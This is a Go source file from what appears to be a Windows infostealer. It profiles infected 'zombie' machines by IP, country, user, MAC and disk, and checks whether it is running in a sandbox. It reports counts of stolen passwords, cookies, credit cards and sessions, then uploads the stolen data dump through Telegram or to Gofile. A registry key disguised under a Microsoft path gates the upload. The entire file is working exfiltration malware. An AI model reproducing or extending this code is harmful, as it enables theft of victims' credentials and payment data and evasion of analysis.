//go:build windows

package datatransfer

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"vortex/envtype"
	"vortex/hutil"
	"vortex/install"
	"vortex/opsysinfo"
	"vortex/telehandler"

	"golang.org/x/sys/windows/registry"
)

var (
	serviceAvailable bool = true
	osType                = opsysinfo.OsVersion()
	osInfo                = opsysinfo.MachineSpecs()
	publicIp              = opsysinfo.PublicIPInfo()
	localNetInfo          = opsysinfo.LocalNetworkInfo()
	hardDisk              = opsysinfo.HardDriveInfo()
	mainFolder            = install.DataDumpLocation()
)

type DataDumpInfo struct {
	DumpFile    string
	DumpSize    int64
	UploadSite  string
	DownloadURL string
}

func uploadDataRequest(uploadUrl string, fileFullPath string) ([]byte, error) {
	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)
	file, err := os.Open(fileFullPath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	fileWriter, _ := bodyWriter.CreateFormFile("file", filepath.Base(file.Name()))
	if _, err = io.Copy(fileWriter, file); err != nil {
		return nil, err
	}
	bodyWriter.Close()

	req, _ := http.NewRequest(http.MethodPost, uploadUrl, bodyBuf)
	req.Header.Set("Content-Type", bodyWriter.FormDataContentType())
	req.Header.Set("User-Agent", telehandler.UserAgent)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if strings.HasPrefix(strconv.Itoa(resp.StatusCode), "50") || strings.HasPrefix(strconv.Itoa(resp.StatusCode), "40") {
		serviceAvailable = false
		return nil, nil
	}

	jsonResponse, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return jsonResponse, nil
}

func checkDataUploadPermission() bool {
	uploadStateKey, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Updates0", registry.QUERY_VALUE)
	if err == registry.ErrNotExist {
		return true
	} else if state, _, err := uploadStateKey.GetIntegerValue("State"); err == nil {
		switch state {
		case 0:
			return true
		case 1:
			return false
		default:
			return true
		}
	}
	return true
}

func verifyDataUploadInfo(responseBody []byte, uploadService int) string {
	var (
		gofile Gofile
	)

	switch uploadService {
	case 1:
		json.Unmarshal(responseBody, &gofile)
		if gofile.Status == "false" {
			return "⚠️ Gofile: Uploading error!"
		}
		return "🚑 Data uploaded successfully\n" + gofile.Data.Downloadpage

	default:
		return ""
	}
}

func zombieBlood() string {
	if install.CheckDeviceFingerprint() {
		return "Old 🏴‍☠️"
	} else {
		if err := install.FingerprintDevice(); err != nil {
			hutil.LogTrace(mainFolder, err)
		}
		return "NEW 🎆"
	}
}

// Check the data dump size and where to be uploaded
func checkDataDumpStatus(mainFolder string, finalDataDump string) (DataDumpInfo, error) {
	var datadumpInfo DataDumpInfo

	datadumpInfo.DumpFile = finalDataDump
	fileInfo, err := os.Stat(filepath.Join(mainFolder, datadumpInfo.DumpFile))
	if err != nil {
		return datadumpInfo, err
	}

	datadumpInfo.DumpSize = fileInfo.Size() / (1024 * 1024)

	switch {
	case datadumpInfo.DumpSize <= 47:
		datadumpInfo.UploadSite = "telegram"

	case datadumpInfo.DumpSize <= 17000:
		datadumpInfo.UploadSite = "gofile"
	}

	return datadumpInfo, nil
}

func UploadDataDump(mainFolder string, finalDataDump string) (DataDumpInfo, error) {
	var (
		macInfo               = opsysinfo.MacAddressVendor(localNetInfo.MacAddress)
		sandboxDetectionState string
	)

	datadumpInfo, err := checkDataDumpStatus(mainFolder, finalDataDump)
	if err != nil {
		return datadumpInfo, err
	}

	if envtype.DetectSandbox() {
		sandboxDetectionState = "Might running inside sandbox 👁"
	} else {
		sandboxDetectionState = "Not detected ✝️"
	}

	msg := "👾 Zombie has joined the chat - " + zombieBlood() + "\n" +
		"⚔️ Zombie ID: " + osInfo.HostID + "\n" +
		"📡 Public IP: " + publicIp.IP + "\n" +
		"🌎 Country: " + publicIp.Country + " " + opsysinfo.CountryFlag() + "\n" +
		"🧛🏻‍♂️ User: " + osInfo.Hostname + "\\" + osInfo.Username + "\n" +
		"🖥 OS: " + osType.ProductName + " " + osType.DisplayVersion + "\n" +
		"☎️ Local IP: " + localNetInfo.LocalAddress + "\n" +
		"Ⓜ️ Mac: " + localNetInfo.MacAddress + " | " + macInfo.Company + "\n" +
		"🎲 Virtualization: " + envtype.VirtualizationSystem() + "\n" +
		"☢️ Sandbox: " + sandboxDetectionState + "\n" +
		"💾 HardDisk: " + fmt.Sprint(hardDisk.DiskTotalSpace/(1024*1024*1024)) + "GB | " + fmt.Sprint(hardDisk.DiskPartitions) + "\n" +
		"\n💌 Data Summary:\n" +
		"  🔑 Passwords: " + fmt.Sprint(hutil.PasswordCounter) + "\n" +
		"  🍪 Cookies: " + fmt.Sprint(hutil.CookieCounter) + "\n" +
		"  💳 CreditCards: " + fmt.Sprint(hutil.CreditCardCounter) + "\n" +
		"  💀 Sessions: " + fmt.Sprint(hutil.Sessions)

	datafile := filepath.Join(mainFolder, datadumpInfo.DumpFile)

	telehandler.SendMessage("✳️ Zombie user <b>" + osInfo.Username + " ID: " + osInfo.HostID + "</b> is Online!")

	switch datadumpInfo.UploadSite {
	case "telegram":
		telehandler.SendMessage("🚁 Uploading data via Telegram..")
		if err = telehandler.UploadFile(datafile, msg); err != nil {
			return datadumpInfo, err
		}
		telehandler.SendSticker()

		if serviceAvailable {
			telehandler.DataUploadState(false)
			return datadumpInfo, nil
		}
		fallthrough

	case "gofile":
		telehandler.SendMessage("🚁 Uploading data via Gofile..")
		respBody, err := uploadDataRequest("https://"+gofileAvailableServer()+".gofile.io/uploadFile", datafile)
		if err != nil {
			return datadumpInfo, err
		}
		telehandler.SendSticker()

		if serviceAvailable {
			datadumpInfo.DownloadURL = verifyDataUploadInfo(respBody, 1)
			telehandler.DataUploadState(false)

			return datadumpInfo, nil
		}

	}

	return datadumpInfo, nil
}
